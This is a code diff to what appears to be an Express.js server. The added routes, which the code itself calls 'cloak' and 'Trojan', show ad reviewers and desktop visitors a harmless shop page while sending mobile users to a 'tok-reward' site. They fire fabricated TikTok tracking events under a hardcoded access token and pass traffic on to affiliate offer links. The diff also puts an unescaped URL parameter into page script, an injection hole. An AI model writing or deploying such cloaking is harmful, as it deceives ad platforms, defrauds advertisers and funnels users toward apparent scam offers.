@@ -224,8 +224,138 @@ app.get('/api/shein/v2/cvr', async (req, res) => {
 
 
 
+// Middleware to cloak SEPH API Traffic
+app.get('/sephapi/:s1', (req, res, next) => {
+    const { s1 } = req.params;
+    const { ttclid } = req.query;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const ttclid = urlParams.get("ttclid");
+                const s1 = "${s1}";
+                const destination = \`https://tok-reward.com/api/sephora/v1/entry?s1=\${s1}&ttclid=\${ttclid}\`;
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = destination;
+                    } else {
+                    }
+            </script>
+            <title>${s1}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${s1} Shop!</h1>
+            <p>You are shopping at: ${s1}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served TRAPI Trojan (${s1})`);
+});
+
+// Middleware to receive TRAPI Beta Traffic (ENTRY)
+app.get('/api/sephora/v1/entry', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect(`https://klcxb6.mcgo2.com/visit/d198df7c-4379-4818-9f7c-ea8e2a34cf6a?slug=paramerror`);
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+    const payload = {
+        event_source: "web",
+        event_source_id: "CPBIPP3C77U2JI2IFOR0",
+        data: [
+            {
+                event: "ViewContent",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+    
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': '362bc64018aad2bc4fd55d121fd54c5f7c6f2ae0',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`LPV Posted (${s1})`);
+        res.redirect(`https://klcxb6.mcgo2.com/visit/16fdfaa7-e6eb-4b8d-b63d-c02ccc4371ac?s1=${s1}&ttclid=${ttclid}`);
+    } catch (error) {
+        console.error('Error making entry POST request', error);
+        res.redirect(`https://klcxb6.mcgo2.com/visit/16fdfaa7-e6eb-4b8d-b63d-c02ccc4371ac?s1=entryposterror`);
+    }
+});
 
 
+// Middleware to receive TRAPI Beta Traffic (EXIT)
+app.get('/api/sephora/v1/exit', async (req, res) => {
+    const { s1, ttclid } = req.query;
+    if (!s1 || !ttclid) {
+        return res.redirect('https://glitchy.go2cloud.org/aff_c?offer_id=481&aff_id=2159');
+    }
+    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ip = extractSingleIP(ipString);
+    const user_agent = req.headers['user-agent'];
+    const event_time = Math.floor(Date.now() / 1000);
+    const external_id = hashValue(ttclid);
+
+   const payload = {
+        event_source: "web",
+        event_source_id: "CPBIPP3C77U2JI2IFOR0",
+        data: [
+            {
+                event: "AddToCart",
+                event_time: event_time,
+                user: {
+                    ttclid: ttclid,
+                    external_id: external_id,
+                    ip: ip,
+                    user_agent: user_agent
+                },
+                page: {
+                    url: "https://tok-reward.com"
+                }
+            }
+        ]
+    };
+
+    try {
+        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/event/track/', payload, {
+            headers: {
+                'Access-Token': '362bc64018aad2bc4fd55d121fd54c5f7c6f2ae0',
+                'Content-Type': 'application/json'
+            }
+        });
+
+        console.log(`CTR Posted (${s1})`);
+        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=481&aff_id=2159&source=${s1}`);
+    } catch (error) {
+        console.error('Error making exit POST request:', error);
+        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=481&aff_id=2159&source=exitposterror`);
+    }
+});
 
 
 
